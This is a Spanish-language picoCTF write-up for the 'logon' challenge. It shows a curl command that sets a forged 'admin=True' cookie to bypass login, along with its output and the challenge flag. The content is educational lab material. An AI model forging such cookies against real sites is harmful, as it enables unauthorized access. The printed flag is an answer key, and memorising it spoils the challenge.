# logon


## Descripción
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/13594/` ([link](https://jupiter.challenges.picoctf.org/problem/13594/)) or http://jupiter.challenges.picoctf.org:13594

## Pistas
- Hmm it doesn't seem to check anyone's password, except for Joe's?

## Solución

- Entramos a la pagina web:  [link](https://jupiter.challenges.picoctf.org/problem/13594/)
- Se obtiene la bandera atraves de Cookie
- Ingresamos en la consola el comando curl en seguida del url de la página web, un flag al final del url, en seguida de la la instrucción que queremos que haga la Cookie en este caso queremos que nos de acceso y se le da la intrucción True.
``` bash
<kmonshe-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   3979      0 --:--:-- --:--:-- --:--:--  3987
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>
kmonshe-picoctf@webshell:~$ 
```
De esta manera se puede acceder a la pagina y encontrar la bandera.

## Bandera
picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}

## Notas adicionales
| Comando | Descripción |
|------ | -------------- |
| curl | es una herramienta de línea de comandos de Linux que sirve para transferir datos hacia o desde un servidor con URL, utilizando cualquiera de los protocolos soportados (HTTP, FTP, POP3, IMAP, SMTP, SCP, SFTP, TFTP, TELNET, LDAP…). |
|-H|encabezado|

La bandera se puede obtener de dos maneras, activando la  Cookies manualmente o por consola.

## Referencias
- [curl](https://www.hostgator.mx/blog/comando-curl-linux/)



